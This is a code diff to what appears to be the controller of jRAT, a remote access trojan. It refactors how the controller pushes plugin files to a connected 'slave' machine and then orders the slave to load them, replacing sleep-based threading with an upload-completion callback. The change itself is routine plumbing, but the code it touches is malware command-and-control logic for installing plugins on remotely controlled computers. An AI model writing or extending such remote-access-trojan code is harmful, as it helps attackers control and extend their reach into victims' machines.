@@ -1,7 +1,6 @@
 package se.jrat.client.packets.incoming;
 
 import java.io.DataInputStream;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -23,6 +22,7 @@ import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.StatisticsOperatingSystem;
 import se.jrat.client.settings.StoreOfflineSlaves;
+import se.jrat.client.threads.UploadThread;
 
 public class Packet3Initialized extends AbstractIncomingPacket {
 
@@ -64,22 +64,16 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 			}
 
 			for (final String key : filesToTransfer.keySet()) {
-				final File file = filesToTransfer.get(key);
+				File file = filesToTransfer.get(key);
 
-				new Thread(new Runnable() {
-					public void run() {
-						try {
-							Thread.sleep(1000L);
-							Main.debug("Transferring " + key);
+				Main.debug("Transferring " + key);
 
-							slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true));
-							Thread.sleep(5000L);
-							slave.addToSendQueue(new Packet101UploadPlugin(key));
-						} catch (Exception ex) {
-							ex.printStackTrace();
-						}
+				slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true, new UploadThread(null, key, file) {
+					@Override
+					public void onComplete() {
+						slave.addToSendQueue(new Packet101UploadPlugin(key));
 					}
-				}).start();
+				}));
 			}
 		}
 	}
